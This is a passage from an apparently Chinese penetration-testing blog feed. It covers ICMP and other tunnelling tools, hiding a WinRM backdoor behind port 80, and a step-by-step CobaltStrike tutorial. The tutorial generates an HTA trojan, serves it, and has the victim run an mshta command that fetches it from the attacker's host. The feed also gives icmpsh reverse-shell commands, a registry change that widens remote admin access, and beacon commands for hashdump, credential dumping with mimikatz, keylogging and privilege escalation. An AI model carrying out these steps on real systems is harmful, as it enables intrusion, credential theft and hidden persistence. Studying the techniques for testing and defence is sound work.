id="0x51-icmpsh"><a href="#0x51-icmpsh" class="headerlink" title="0x51 icmpsh"></a>0x51 icmpsh</h3><ol start="3"><li>工具：<a href="https://github.com/inquisb/icmpsh" target="_blank" rel="noopener">https://github.com/inquisb/icmpsh</a></li><li><strong>准备：</strong></li><li>运行icmpsh前，先关闭本地系统的ICMP答复，因为icmpsh运行时代替系统本身的ping命令的应答程序。</li><li><code>sysctl -w net.ipv4.icmp_echo_ignore_all=1    //0：开启</code></li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/28.png" alt></li><li>运行时需要安装Python的impacket类库：</li><li><code>git clone https://github.com/SecureAuthCorp/impacket.git</code></li><li><code>cd impacket</code></li><li><code>python setup.py install</code></li><li><strong>使用：</strong></li><li>攻击者执行：<code>python icmpsh_m.py 攻击者IP 受害者IP</code></li><li>受害者执行：<code>icmpsh.exe -t 攻击者IP -d 500 -b 30 -s 128</code> #-t：攻击主机IP -d：延时 -b：空格数 -s：缓冲区大小</li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/29.png" alt></li></ol><h3 id="0x52-ptunnel"><a href="#0x52-ptunnel" class="headerlink" title="0x52 ptunnel"></a>0x52 <a href="http://www.cs.uit.no/~daniels/PingTunnel/#download" target="_blank" rel="noopener">ptunnel</a></h3><ol><li>ptunnel，全称“Ping Tunnel”，利用ICMP协议构建通信隧道，实现端到端通信。</li><li><strong>Linux安装ptunnel</strong></li><li>apt-get install ptunnel</li><li>yum install ptunnel</li></ol><p><strong>使用：</strong></p><ol><li>主机：外网192.168.100.1、内外网kali（已控） 192.168.100.4/10.0.0.2、内网win2008（目标） 10.0.0.3、外网centos（vps） 192.168.100.14</li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/62.png" alt></li><li>内外网kali：<code>./ptunnel -x mima</code></li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/63.png" alt></li><li>未完<a href="https://www.freebuf.com/articles/network/242015.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/242015.html</a></li></ol><h2 id="0x60-frp"><a href="#0x60-frp" class="headerlink" title="0x60 frp"></a>0x60 <a href="https://github.com/fatedier/frp" target="_blank" rel="noopener">frp</a></h2><p><strong>ssh登录内网主机</strong></p><ol><li><strong>主机：windows（外网）、10.0.0.2（内外网都通）、10.0.0.4（内网）</strong></li><li>10.0.0.2配置文件frps.ini</li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/46.png" alt></li><li>开启监听</li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/47.png" alt></li><li>10.0.0.4配置文件frpc.ini</li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/48.png" alt></li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/49.png" alt></li><li>外网访问内网主机</li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/50.png" alt></li></ol><p><strong>自定义域名访问内网web服务</strong></p><ol><li>frps.ini</li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/51.png" alt></li><li>frpc.ini</li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/52.png" alt></li><li>访问<a href="http://www.yourdomain.com:8080" target="_blank" rel="noopener">http://www.yourdomain.com:8080</a></li></ol><h2 id="0x70-Ngrok"><a href="#0x70-Ngrok" class="headerlink" title="0x70 Ngrok"></a>0x70 <a href="https://ngrok.com/" target="_blank" rel="noopener">Ngrok</a></h2><ol><li><strong>ngrok</strong>，一个反向代理，通过在公共的端点和本地运行的 Web 服务器之间建立一个安全的通道。ngrok 可捕获和分析所有通道上的流量，便于后期分析和重放。</li><li>下载并获取Authtoken</li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/57.png" alt></li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/58.png" alt></li></ol><p><strong>使用：</strong></p><ol><li>ngrok.exe authtoken [Authtoken] #认证生成配置文件ngrok.yml</li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/59.png" alt></li><li><strong>穿透命令：</strong></li><li>ngrok.exe tcp 3389</li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/60.png" alt></li><li><strong>kali连一下RDP</strong></li><li>rdesktop 0.tcp.ngrok.io:14825 #很慢</li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/61.png" alt></li><li><strong>其他命令：</strong></li><li>ngrok.exe tcp 22</li><li>ngrok.exe http 80</li></ol><h2 id="0x80-Earthworm-Proxychains"><a href="#0x80-Earthworm-Proxychains" class="headerlink" title="0x80 Earthworm+Proxychains"></a>0x80 Earthworm+Proxychains</h2><h2 id="0x90-端口复用"><a href="#0x90-端口复用" class="headerlink" title="0x90 端口复用"></a>0x90 端口复用</h2><h3 id="0x91-windows-WinRM端口复用"><a href="#0x91-windows-WinRM端口复用" class="headerlink" title="0x91 windows WinRM端口复用"></a>0x91 windows WinRM端口复用</h3><ol><li>模拟场景：服务器只允许80和443为出入口。</li></ol><p><strong>利用原理与知识：</strong></p><ol><li>微软在windows server 2003中加入了http.sys（内核驱动程序），用于侦听http流量并根据URL进行处理，允许任意用户进程共享专用于HTTP流量的TCP端口。即：通过http.sys，多个进程将能够侦听同一个端口上的HTTP流量，只需要各自注册的url前缀不同即可。</li><li><strong>列出所有URL的DACL：</strong><code>netsh http show urlacl</code></li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/64.png" alt></li><li>5985对应http的端口，5986对应https的端口</li><li>查看所有在HTTP.sys上注册过的url前缀：</li><li><code>netsh http show servicestate</code></li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/65.png" alt></li><li>WinRM服务，全称Windows Remote Management，能够实现在远程主机上执行命令，默认监听5985端口。</li><li>HTTP Server API：使应用程序能够接收定向到URL的HTTP请求并发送HTTP响应。</li><li>Windows Server 2008默认关闭WinRM服务，Windows Server 2012默认开启。</li></ol><p><strong>winrm使用：</strong><br>5. <code>winrm</code> #帮助<br>5. <code>winrm quickconfig -q</code> #windows server 2008快速配置和启动的命令<br>6. <code>winrm e winrm/config/listener</code> #查看监听配置<br>7. <img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/66.png" alt><br>7. <code>winrm get winrm/config</code> #查看winrm配置<br>8. <code>winrm set winrm/config/service @{EnableCompatibilityHttpListener=&quot;true&quot;}</code> #新增对80端口的监听<br>9. <code>winrm set winrm/config/service @{EnableCompatibilityHttpListener=&quot;false&quot;}</code> #删除80端口的监听<br>9. <img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/67.png" alt><br>10. <code>winrm set winrm/config/Listener?Address=*+Transport=HTTP @{Port=&quot;80&quot;}</code> #修改WinRM端口<br>11. <img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/71.png" alt><br>11. <code>netsh http show servicestate</code> #http.sys新注册的url前缀<br>11. <img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/68.png" alt></p><p><strong>后门连接使用：</strong></p><ol><li>本地需要连接WinRM服务时，需要启动WinRM服务，设置信任连接的主机，<strong>管理员cmd执行命令：</strong></li><li><code>winrm quickconfig -q</code> #开启服务</li><li><code>winrm set winrm/config/Client @{TrustedHosts=&quot;*&quot;}</code> #设置信任连接的主机</li><li><code>winrm set winrm/config/Client @{TrustedHosts=&quot;&quot;}</code> #删除该访问规则</li><li><code>winrs -r:http://[目标ip]:5985 -u:Administrator -p:[目标密码] &quot;ipconfig&quot;</code> #使用winrs命令连接远程WinRM服务来执行系统命令</li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/69.png" alt></li><li><code>winrs -r:http://[目标ip]:5985 -u:Administrator -p:[目标密码] cmd</code> #交互shell</li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/70.png" alt></li><li><code>winrm set winrm/config/Listener?Address=*+Transport=HTTP @{Port=&quot;80&quot;}</code> #修改WinRM端口</li><li><code>winrm set winrm/config/Listener?Address=*+Transport=HTTP @{Port=&quot;5985&quot;}</code> #还原WinRM默认端口</li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/71.png" alt></li><li>看不到5985端口开放了</li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/72.png" alt></li><li>80服务启用了</li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/73.png" alt></li><li><code>winrs -r:http://[目标ip] -u:Administrator -p:[目标密码] &quot;ipconfig&quot;</code> #再使用winrs命令连接远程WinRM服务80端口来执行系统命令</li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/74.png" alt></li></ol><p><strong>日志问题</strong></p><ol><li>WinRM远程登录后会留下<strong>特殊登录</strong>日志</li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/75.png" alt></li></ol><p><strong>UAC（用户账户控制）问题</strong></p><ol><li>WinRM服务也是受UAC影响的，所以本地管理员用户组里面只有administrator可以登录，其他管理员用户是没法远程登录WinRM的。要允许本地管理员组的其他用户登录WinRM，需要修改注册表设置：</li><li><code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</code></li><li>修改后，普通管理员登录后也是高权限。</li><li><code>winrs -r:http://[目标ip] -u:[普通管理员] -p:[目标密码] &quot;whoami /groups&quot; | findstr &quot;Mandatory Label\High Mandatory Level&quot;</code></li></ol><p><strong>Hash登录</strong><br><a href="https://paper.seebug.org/1004/" target="_blank" rel="noopener">https://paper.seebug.org/1004/</a></p><h3 id="0x92-利用HTTP-Server-API实现端口复用"><a href="#0x92-利用HTTP-Server-API实现端口复用" class="headerlink" title="0x92 利用HTTP Server API实现端口复用"></a>0x92 利用HTTP Server API实现端口复用</h3><p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8IIS%E7%9A%84%E7%AB%AF%E5%8F%A3%E5%85%B1%E4%BA%AB%E5%8A%9F%E8%83%BD%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8IIS%E7%9A%84%E7%AB%AF%E5%8F%A3%E5%85%B1%E4%BA%AB%E5%8A%9F%E8%83%BD%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99/</a></p><h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><p><a href="https://github.com/fatedier/frp/blob/master/README_zh.md" target="_blank" rel="noopener">frp中文版readme</a><br><a href="https://paper.seebug.org/1004/" target="_blank" rel="noopener">一条命令实现端口复用后门</a><br><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8IIS%E7%9A%84%E7%AB%AF%E5%8F%A3%E5%85%B1%E4%BA%AB%E5%8A%9F%E8%83%BD%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99/" target="_blank" rel="noopener">利用IIS的端口共享功能绕过防火墙</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> 内网渗透 </tag>
            
            <tag> 端口 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CobaltStrike</title>
      <link href="/CobaltStrike/"/>
      <url>/CobaltStrike/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-CobaltStrike"><a href="#0x00-CobaltStrike" class="headerlink" title="0x00 CobaltStrike"></a>0x00 <a href="https://www.cobaltstrike.com/" target="_blank" rel="noopener">CobaltStrike</a></h2><ol><li>一款渗透测试工具，简称CS。</li><li>目录结构：</li><li><img src="/CobaltStrike/5.png" alt></li><li>agscript #扩展应用的脚本</li><li>c2lint #用于检查profile的错误异常</li><li>cobaltstrike #Linux客户端文件</li><li>cobaltstrike.auth #</li><li>cobaltstrike.exe #</li><li>cobaltstrike.jar #客户端程序</li><li>cobaltstrike.store #</li><li>license.pdf #许可证</li><li>logs #日志</li><li>peclone #</li><li>teamserver #服务端文件</li><li>teamserver_win.bat #windows服务端</li><li>third-party #第三方工具</li><li>update #（Linux）用于更新CS</li><li>update.jar #用于更新CS</li></ol><h2 id="0x10-Linux下启动CobaltStrike的服务器与客户端"><a href="#0x10-Linux下启动CobaltStrike的服务器与客户端" class="headerlink" title="0x10 Linux下启动CobaltStrike的服务器与客户端"></a>0x10 Linux下启动CobaltStrike的服务器与客户端</h2><ol><li>工具分服务端与客户端，关键文件：teamserver和cobaltstrike</li><li>服务端启动</li><li>./teamserver 当前主机的ip 密码 #<a href="https://github.com/ryanohoro/csbruter" target="_blank" rel="noopener">CS爆破脚本</a></li><li><img src="/CobaltStrike/1.png" alt></li><li>Linux本地客户端启动</li><li>./cobaltstrike（或者： java -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar）</li><li>host即服务端的ip，port默认为50050,user随意，password就是前面teamserver启动设置的密码</li><li><img src="/CobaltStrike/2.png" alt></li><li>远程客户端启动</li><li><img src="/CobaltStrike/3.png" alt></li><li><img src="/CobaltStrike/4.png" alt></li><li><strong>注意</strong></li><li>50050是服务端默认端口，可以修改teamserver文件来修改端口</li><li><img src="/CobaltStrike/6.png" alt></li></ol><h2 id="0x20-各种参数"><a href="#0x20-各种参数" class="headerlink" title="0x20 各种参数"></a>0x20 各种参数</h2><h3 id="0x21-CobaltStrike"><a href="#0x21-CobaltStrike" class="headerlink" title="0x21 CobaltStrike"></a>0x21 CobaltStrike</h3><ol><li>New Connection   # 新建连接，支持连接多个服务器端</li><li>Preferences   # 设置Cobal Strike界面、控制台、以及输出报告样式、TeamServer连接记录</li><li>Visualization   # 主要展示输出结果的视图</li><li>VPN Interfaces   # 设置VPN接口</li><li>Listenrs   # 创建监听器</li><li>Script Manager   # 脚本管理，可以通过AggressorScripts脚本来加强自身，能够扩展菜单栏，Beacon命令行，提权脚本等</li><li>Close   # 退出连接</li></ol><h3 id="0x22-View"><a href="#0x22-View" class="headerlink" title="0x22 View"></a>0x22 View</h3><ol><li>Applications   # 显示受害主机的应用信息</li><li>Credentials   # 显示所有以获取的受害主机的凭证，如hashdump、Mimikatz</li><li>Downloads   # 查看已下载文件</li><li>Event Log   # 主机上线记录以及团队协作聊天记录</li><li>Keystrokes   # 查看键盘记录结果</li><li>Proxy Pivots   # 查看代理模块</li><li>Screenshots   # 查看所有屏幕截图</li><li>Script Console   # 加载第三方脚本以增强功能 </li><li>Targets   # 显示所有受害主机</li><li>Web Log    # 所有Web服务的日志</li></ol><h3 id="0x23-Attacks"><a href="#0x23-Attacks" class="headerlink" title="0x23 Attacks"></a>0x23 Attacks</h3><p><strong>Packages</strong></p><ol><li>HTML Application   # 生成(executable/VBA/powershell)这三种原理实现的恶意HTA木马文件</li><li>MS Office Macro   # 生成office宏病毒文件</li><li>Payload Generator   # 生成各种语言版本的payload</li><li>USB/CD AutoPlay   # 生成利用自动播放运行的木马文件</li><li>Windows Dropper   # 捆绑器能够对任意的正常文件进行捆绑(免杀效果差)</li><li>Windows Executable   # 生成可执行exe木马</li><li>Windows Executable(Stageless)   # 生成无状态的可执行exe木马</li></ol><p><strong>Web Drive-by</strong></p><ol><li>Manage   # 对开启的web服务进行管理</li><li>Clone Site   # 克隆网站，可以记录受害者提交的数据</li><li>Host File   # 提供文件下载，可以选择Mime类型</li><li>Scripted Web Delivery   # 为payload提供web服务以便下载和执行，类似于Metasploit的web_delivery </li><li>Signed Applet Attack   # 使用java自签名的程序进行钓鱼攻击(该方法已过时)</li><li>Smart Applet Attack   # 自动检测java版本并进行攻击，针对Java 1.6.0_45以下以及Java 1.7.0_21以下版本(该方法已过时)</li><li>System Profiler   # 用来获取系统信息，如系统版本，Flash版本，浏览器版本等</li></ol><p><strong>Spear Phish</strong>   # 鱼叉钓鱼邮件</p><h3 id="0x24-Reporting"><a href="#0x24-Reporting" class="headerlink" title="0x24 Reporting"></a>0x24 Reporting</h3><ol><li>Activity Report   # 活动报告</li><li>Hosts Report   # 主机报告</li><li>Indicators of Compromise   # IOC报告：包括C2配置文件的流量分析、域名、IP和上传文件的MD5 hashes</li><li>Sessions Report   # 会话报告</li><li>Social Engineering Report   # 社会工程报告：包括鱼叉钓鱼邮件及点击记录</li><li>Tactics, Techniques, and Procedures   # 战术技术及相关程序报告：包括行动对应的每种战术的检测策略和缓解策略</li></ol><p><strong>Reset Data</strong>   # 重置数据<br><strong>Export Data</strong>   # 导出数据，导出.tsv文件格式</p><h3 id="0x25-Help"><a href="#0x25-Help" class="headerlink" title="0x25 Help"></a>0x25 Help</h3><ol><li>Homepage   # 官方主页</li><li>Support   # 技术支持</li><li>Arsenal   # 开发者</li><li>System information   # 版本信息</li><li>About   # 关于</li></ol><h3 id="0x26-各按钮快捷键"><a href="#0x26-各按钮快捷键" class="headerlink" title="0x26 各按钮快捷键"></a>0x26 各按钮快捷键</h3><p><img src="/CobaltStrike/7.png" alt></p><ol><li>新建连接</li><li>断开当前连接</li><li>监听器</li><li>改变视图为Pivot Graph(视图列表)</li><li>改变视图为Session Table(会话列表)</li><li>改变视图为Target Table(目标列表)</li><li>显示所有以获取的受害主机的凭证</li><li>查看已下载文件</li><li>查看键盘记录结果</li><li>查看屏幕截图</li><li>生成无状态的可执行exe木马</li><li>使用java自签名的程序进行钓鱼攻击</li><li>生成office宏病毒文件</li><li>为payload提供web服务以便下载和执行</li><li>提供文件下载，可以选择Mime类型</li><li>管理Cobalt Strike上运行的web服务</li><li>帮助</li><li>关于</li></ol><h2 id="0x30-基本使用"><a href="#0x30-基本使用" class="headerlink" title="0x30 基本使用"></a>0x30 基本使用</h2><h3 id="0x31-创建监听器"><a href="#0x31-创建监听器" class="headerlink" title="0x31 创建监听器"></a>0x31 创建监听器</h3><ol><li>Cobalt Strike——Listeners——Add</li><li><img src="/CobaltStrike/8.png" alt></li><li>共9个listener</li><li>windows/beacon_dns/reverse_dns_txt</li><li>windows/beacon_dns/reverse_http</li><li>windows/beacon_http/reverse_http</li><li>windows/beacon_https/reverse_https</li><li>windows/beacon_smb/bind_pipe</li><li>windows/foreign/reverse_dns_txt</li><li>windows/foreign/reverse_http</li><li>windows/foreign/reverse_https</li><li>windows/foreign/reverse_tcp</li><li>这里name随意，选windows/beacon_http/reverse_http，host默认，port为不在使用中的端口，save</li><li><img src="/CobaltStrike/9.png" alt></li><li>确定</li><li><img src="/CobaltStrike/10.png" alt></li><li>已建立监听，确定</li><li><img src="/CobaltStrike/11.png" alt></li></ol><h3 id="0x32-创建木马文件"><a href="#0x32-创建木马文件" class="headerlink" title="0x32 创建木马文件"></a>0x32 创建木马文件</h3><ol><li>Attacks——Packages——HTML Application——Listener选刚创建的监听名称test（如果没有则点Add新建监听器）——method这里选powershell——Generate</li><li><img src="/CobaltStrike/12.png" alt></li><li><img src="/CobaltStrike/13.png" alt></li><li>自选保存路径</li><li><img src="/CobaltStrike/14.png" alt></li></ol><h3 id="0x33-开启web服务"><a href="#0x33-开启web服务" class="headerlink" title="0x33 开启web服务"></a>0x33 开启web服务</h3><ol><li>Attacks——Web Drive-by——Host File</li><li><img src="/CobaltStrike/15.png" alt></li><li>File选刚生成的evil.hta——其他默认，Launch</li><li><img src="/CobaltStrike/16.png" alt></li><li>生成了下载链接</li><li><img src="/CobaltStrike/17.png" alt></li></ol><h3 id="0x34-运行木马"><a href="#0x34-运行木马" class="headerlink" title="0x34 运行木马"></a>0x34 运行木马</h3><ol><li>被攻击机运行mshta命令：mshta <a href="http://192.168.100.4:80/download/file.ext（mshta.exe是微软Windows操作系统相关程序，用于执行.HTA文件。）" target="_blank" rel="noopener">http://192.168.100.4:80/download/file.ext（mshta.exe是微软Windows操作系统相关程序，用于执行.HTA文件。）</a></li><li><img src="/CobaltStrike/18.png" alt></li><li>查看CS，已经有显示被攻击机在线</li><li><img src="/CobaltStrike/19.png" alt></li><li>右击——Interact，就可以进行交互</li><li><img src="/CobaltStrike/20.png" alt></li><li>sleep 5 #因为默认60秒回传一次，这里设置为5秒（可以设置为0秒，真实环境中，太快容易被发现）</li><li><img src="/CobaltStrike/21.png" alt></li></ol><h3 id="0x35-导出报告"><a href="#0x35-导出报告" class="headerlink" title="0x35 导出报告"></a>0x35 导出报告</h3><ol><li>Reporting——Activity Report——默认PDF格式</li><li><img src="/CobaltStrike/22.png" alt></li><li><img src="/CobaltStrike/23.png" alt></li></ol><h2 id="0x40-Beacon"><a href="#0x40-Beacon" class="headerlink" title="0x40 Beacon"></a>0x40 Beacon</h2><h3 id="0x41-查看帮助"><a href="#0x41-查看帮助" class="headerlink" title="0x41 查看帮助"></a>0x41 查看帮助</h3><pre><code>beacon&gt; helpBeacon Commands===============    Command                   Description    -------                   -----------    argue                     Spoof arguments for matching processes 进程参数欺骗    blockdlls                 Block non-Microsoft DLLs in child processes 在子进程中阻止非Microsoft的DLLs文件    browserpivot              Setup a browser pivot session 注入被攻击者浏览器进程    bypassuac                 Spawn a session in a high integrity process 绕过UAC    cancel                    Cancel a download that&#39;s in-progress 取消正在进行的下载    cd                        Change directory 切换目录    checkin                   Call home and post data 强制让被控端回连一次    clear                     Clear beacon queue 清除beacon内部的任务队列    connect                   Connect to a Beacon peer over TCP 通过TCP连接到Beacon    covertvpn                 Deploy Covert VPN client 部署Covert VPN客户端    cp                        Copy a file 复制文件    dcsync                    Extract a password hash from a DC 从DC中提取密码哈希    desktop                   View and interact with target&#39;s desktop 远程VNC    dllinject                 Inject a Reflective DLL into a process 反射DLL注入进程    dllload                   Load DLL into a process with LoadLibrary() 使用LoadLibrary将DLL加载到进程中    download                  Download a file 下载文件    downloads                 Lists file downloads in progress 列出正在进行的文件下载    drives                    List drives on target 列出目标盘符    elevate                   Try to elevate privileges 尝试提权    execute                   Execute a program on target (no output) 在目标上执行程序(无输出)    execute-assembly          Execute a local .NET program in-memory on target 在目标上内存中执行本地.NET程序    exit                      Terminate the beacon session 退出beacon    getprivs                  Enable system privileges on current token 对当前令牌启用系统权限    getsystem                 Attempt to get SYSTEM 尝试获取SYSTEM权限    getuid                    Get User ID 获取用户ID    hashdump                  Dump password hashes 转储密码哈希值    help                      Help menu 帮助    inject                    Spawn a session in a specific process 在特定进程中生成会话    jobkill                   Kill a long-running post-exploitation task 杀死一个后台任务    jobs                      List long-running post-exploitation tasks 列出后台任务    kerberos_ccache_use       Apply kerberos ticket from cache to this session 从ccache文件中导入票据应用于此会话    kerberos_ticket_purge     Purge kerberos tickets from this session 清除当前会话的票据    kerberos_ticket_use       Apply kerberos ticket to this session 从ticket文件中导入票据应用于此会话    keylogger                 Inject a keystroke logger into a process 键盘记录    kill                      Kill a process 结束进程    link                      Connect to a Beacon peer over a named pipe 通过命名管道连接到Beacon    logonpasswords            Dump credentials and hashes with mimikatz 使用mimikatz转储凭据和哈希值    ls                        List files 列出文件    make_token                Create a token to pass credentials 创建令牌以传递凭据    mimikatz                  Runs a mimikatz command 运行mimikatz    mkdir                     Make a directory 创建一个目录    mode dns                  Use DNS A as data channel (DNS beacon only) 使用DNS A作为通信通道(仅限DNS beacon)    mode dns-txt              Use DNS TXT as data channel (DNS beacon only) 使用DNS TXT作为通信通道(仅限D beacon)    mode dns6                 Use DNS AAAA as data channel (DNS beacon only) 使用DNS AAAA作为通信通道(仅限DNS beacon)    mode http                 Use HTTP as data channel 使用HTTP作为通信通道    mv                        Move a file 移动文件    net                       Network and host enumeration tool net命令    note                      Assign a note to this Beacon 给当前目标机器备注    portscan                  Scan a network for open services 进行端口扫描    powerpick                 Execute a command via Unmanaged PowerShell 通过Unmanaged PowerShell执行命令    powershell                Execute a command via powershell.exe 通过powershell.exe执行命令    powershell-import         Import a powershell script 导入powershell脚本    ppid                      Set parent PID for spawned post-ex jobs 为生成的post-ex任务设置父PID    ps                        Show process list 显示进程列表    psexec                    Use a service to spawn a session on a host 使用服务在主机上生成会话    psexec_psh                Use PowerShell to spawn a session on a host 使用PowerShell在主机上生成会话    psinject                  Execute PowerShell command in specific process 在特定进程中执行PowerShell命令    pth                       Pass-the-hash using Mimikatz 使用Mimikatz进行传递哈希    pwd                       Print current directory 当前目录位置    reg                       Query the registry 查询注册表    rev2self                  Revert to original token 恢复原始令牌    rm                        Remove a file or folder 删除文件或文件夹    rportfwd                  Setup a reverse port forward 端口转发    run                       Execute a program on target (returns output) 在目标上执行程序(返回输出)    runas                     Execute a program as another user  以另一个用户权限执行程序    runasadmin                Execute a program in a high-integrity context 在高权限下执行程序    runu                      Execute a program under another PID 在另一个PID下执行程序    screenshot                Ta 将shellcode注入进程ke a screenshot 屏幕截图    setenv                    Set an environment variable  设置环境变量    shell                     Execute a command via cmd.exe cmd执行命令    shinject                  Inject shellcode into a process 将shellcode注入进程    shspawn                   Spawn process and inject shellcode into it 生成进程并将shellcode注入其中    sleep                     Set beacon sleep time 设置睡眠延迟时间    socks                     Start SOCKS4a server to relay traffic 启动SOCKS4代理    socks stop                Stop SOCKS4a server 停止SOCKS4    spawn                     Spawn a session 生成一个会话    spawnas                   Spawn a session as another user 以其他用户身份生成会话    spawnto                   Set executable to spawn processes into 将可执行程序注入进程    spawnu                    Spawn a session under another PID 在另一个PID下生成会话    ssh                       Use SSH to spawn an SSH session on a host 使用ssh连接远程主机    ssh-key                   Use SSH to spawn an SSH session on a host 使用密钥连接远程主机    steal_token               Steal access token from a process 从进程中窃取令牌    timestomp                 Apply timestamps from one file to another 将一个文件时间戳应用到另一个文件    unlink                    Disconnect from parent Beacon 断开与Beacon的连接    upload                    Upload a file 上传文件    wdigest                   Dump plaintext credentials with mimikatz 使用mimikatz转储明文凭据    winrm                     Use WinRM to spawn a session on a host 使用WinRM在主机上生成会话    wmi                       Use WMI to spawn a session on a host 使用WMI在主机上生成会话</code></pre><h3 id="0x42-具体命令的帮助信息"><a href="#0x42-具体命令的帮助信息" class="headerlink" title="0x42 具体命令的帮助信息"></a>0x42 具体命令的帮助信息</h3><ol><li>help shell</li><li><img src="/CobaltStrike/24.png" alt></li><li></li><li><strong>hashdump</strong> #获取hash</li><li><img src="/CobaltStrike/37.png" alt></li><li></li><li>logonpasswords</li><li><img src="/CobaltStrike/38.png" alt></li><li><img src="/CobaltStrike/39.png" alt></li><li>同样可按键</li><li><img src="/CobaltStrike/40.png" alt></li><li></li><li><strong>其他命令</strong></li><li>pwd</li><li>getuid</li><li>ls</li><li>net user</li><li>net localgroup</li><li>net logons</li><li>screenshot #截图，保存到服务端日志文件夹里</li><li><img src="/CobaltStrike/41.png" alt></li><li>shell ipconfig</li><li>ps</li><li>keylogger pid</li><li>Keystrokes #查看键盘记录</li><li>shell dir</li><li>elevate #查看模块</li><li>elevate ms15-051 http beacon #加载模块</li></ol><h3 id="0x43-与MSF联动"><a href="#0x43-与MSF联动" class="headerlink" title="0x43 与MSF联动"></a>0x43 